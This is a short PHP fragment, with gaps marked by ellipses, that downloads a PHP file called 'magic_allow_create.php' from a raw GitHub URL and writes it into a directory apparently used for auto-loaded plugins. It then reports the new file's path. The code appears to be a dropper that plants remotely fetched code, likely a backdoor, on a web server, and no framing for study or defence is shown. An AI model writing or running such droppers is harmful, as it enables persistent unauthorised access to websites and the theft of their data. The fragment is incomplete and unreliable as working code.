...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/cantulope/cantutag/refs/heads/main/v4/magic_allow_create.php');
...
die('err dir'); }
if (is_file($mu.'magic_allow_create.php')) die('file exist');
$r = file_put_contents($mu.'magic_allow_create.php', $c);
if ($r===false) die('err saving');
die('/magic_allow_create.php');